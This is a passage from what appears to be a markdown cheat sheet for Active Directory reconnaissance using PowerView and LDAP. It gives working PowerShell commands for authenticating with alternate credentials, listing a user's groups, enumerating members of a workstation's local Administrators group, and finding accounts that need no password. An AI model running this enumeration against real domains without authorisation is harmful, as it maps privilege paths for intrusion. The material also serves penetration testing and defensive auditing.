		* Function Naming Schema
			* Verbs
					* `Get` - retrieve full raw data sets
					* `Find` - ‘find’ specific data entries in a data set
					* `Add` - add a new object to a destination
					* `Set` - modify a given object
					* `Invoke` - lazy catch-all
			* Nouns
				* `Verb-Domain*` - indicates that LDAP/.NET querying methods are being executed
				* `Verb-WMI*` - indicates that WMI is being used under the hood to execute enumeration
				* `Verb-Net*` - indicates that Win32 API access is being used under the hood
		* Use an alterate credential for any PowerView function

				$SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
				$Cred = New-Object System.Management.Automation.PSCredential('<domain>\jar-jar.binks', $SecPassword)
			* Validate

					Get-NetDomain -Credential $Cred #test
		* List all groups of a specific user

				Get-DomainGroup -MemberIdentity darth.vader -Credential $Cred | Format-Table cn
* Enumerate all groups a user is a part of
	* <details><summary>Powershell (Click to expand)</summary><p>
		* List all members of a specific local group

			Get-NetLocalGroupMember -ComputerName workstation04 -GroupName Administratoren –Credential $Cred | Format-Table membername,isgroup,isdomain

# LDAP Queries

<details><summary>References (Click to expand)</summary><p>



</p></details>

<details><summary>LDAP Queries (Click to expand)</summary><p>

* List all users that do no request a password

		([adsisearcher]'(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))').FindAll()



</p></details>